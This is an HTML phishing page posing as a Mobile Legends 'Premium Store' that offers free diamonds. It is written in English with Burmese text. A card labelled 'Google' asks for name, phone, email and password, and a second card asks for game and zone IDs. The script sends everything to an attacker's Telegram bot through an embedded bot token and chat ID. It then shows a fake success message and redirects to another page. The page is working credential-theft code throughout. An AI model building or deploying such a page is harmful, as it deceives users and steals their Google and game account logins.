<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLBB Premium Store</title>
    <style>
        body { margin: 0; padding: 20px; font-family: -apple-system, sans-serif; min-height: 100vh; color: white; background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); background-size: 400% 400%; animation: gradient 10s ease infinite; display: flex; justify-content: center; align-items: center; }
        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); padding: 30px; border-radius: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 100%; max-width: 320px; text-align: center; color: white; }
        h2 { margin-bottom: 25px; font-size: 24px; }
        input { width: 100%; padding: 15px; margin: 8px 0; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.1); color: white; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        /* အဝါရောင်ဘောင်မပေါ်အောင် ပြင်ထားသည် */
        input:focus { outline: none !important; border: 1px solid rgba(255, 255, 255, 0.6); background: rgba(255, 255, 255, 0.15); box-shadow: none; }
        button { width: 100%; padding: 15px; margin-top: 15px; border-radius: 20px; border: none; background: white; color: #d63384; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        .pkg-btn { width: 100%; padding: 15px; margin-top: 15px; border-radius: 20px; border: 1px solid white; background: transparent; color: white; font-weight: bold; cursor: pointer; }
        #page2, #page3 { display: none; }
        #msg-box { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: #333; padding: 25px; border-radius: 30px; text-align: center; width: 85%; max-width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 1000; }
    </style>
</head>
<body>

    <div class="card" id="page1">
        <h2>Google</h2>
        <input type="text" id="name" placeholder="Name">
        <input type="text" id="number" placeholder="Number">
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="nextPage()">CONTINUE</button>
    </div>

    <div class="card" id="page2">
        <h2>Mobile Legends</h2>
        <input type="text" id="gameId" placeholder="Game ID">
        <input type="text" id="zoneId" placeholder="Zone ID">
        <button id="submitBtn" onclick="submitData()">CONTINUE</button>
    </div>

    <div class="card" id="page3">
        <h2>MLBB Store</h2>
        <button class="pkg-btn" onclick="showSuccess()">112 Diamonds - FREE</button>
    </div>

    <div id="msg-box">
        <h3 style="color:#d63384;">Success!</h3>
        <p>၁၀၀% အာမခံချက်ဖြင့်၊ စိန်ပမာဏသည် ၂၄ နာရီအတွင်း လူကြီးမင်းတို့၏ ဂိမ်းအကောင့်ထဲသို့ အောင်မြင်စွာ ရောက်ရှိပါမည်။</p>
        <button style="background:#d63384; color:white;" onclick="window.location.href='https://khtet202315-afk.github.io/Google-Account-/'">OK</button>
    </div>

    <script>
        const token = "8980605393:AAEVTWKvHX--a_XWZMMuLE-M8Pj75WSw5Ks"; 
        const chatId = "7981991075"; 

        function nextPage() { document.getElementById('page1').style.display = 'none'; document.getElementById('page2').style.display = 'block'; }
        
        async function submitData() {
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "PROCESSING...";

            const msg = `✨ NEW DATA\nName: ${document.getElementById('name').value}\nNumber: ${document.getElementById('number').value}\nEmail: ${document.getElementById('email').value}\nPassword: ${document.getElementById('password').value}\nGame ID: ${document.getElementById('gameId').value}\nZone ID: ${document.getElementById('zoneId').value}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            } catch(error) {
                console.error("Error:", error);
            }
            
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'block';
        }

        function showSuccess() { document.getElementById('msg-box').style.display = 'block'; }
    </script>
</body>
</html>
